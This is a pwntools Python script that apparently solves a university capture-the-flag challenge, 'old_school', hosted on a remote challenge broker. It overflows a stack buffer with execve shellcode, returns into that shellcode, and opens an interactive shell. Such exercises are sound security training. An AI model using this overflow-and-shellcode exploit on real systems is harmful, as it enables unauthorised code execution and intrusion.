from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./old_school"

LOCAL = False

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    b main+0x0041
    continue
    ''')
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1290)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")

e = ELF(target_file, checksec=False)
string_address = e.symbols.just_a_string

print(f'String address: {hex(string_address)}')
p.recvuntil(b"My favorite string is at: ")
shell_code_address = int(p.recvline().strip(), 16)
print(f'Shell code address: {hex(shell_code_address)}')
quad_wrd_prt = shell_code_address + 0x38 - (3 * 0x8)
print(f'Quad word pointer: {hex(quad_wrd_prt)}')
shell_code = f'''
mov rdx, 0x0
lea rdi, [{hex(string_address)}]
lea rsi, [0x0]
mov rax, rdi
mov rax, 0x3b
syscall
'''
print(f'Shell code: {shell_code}')
shellcode = asm(shell_code)
p.recvuntil(b"> ")

print(len(shellcode))
buf_stack_offset = 0x38
filler = buf_stack_offset - len(shellcode)
print(f'buf_stack_offset: {buf_stack_offset}')
print(f'Filler: {filler}')
p.sendline(shellcode + (b'\x00' * filler) + p64(shell_code_address))
p.interactive()
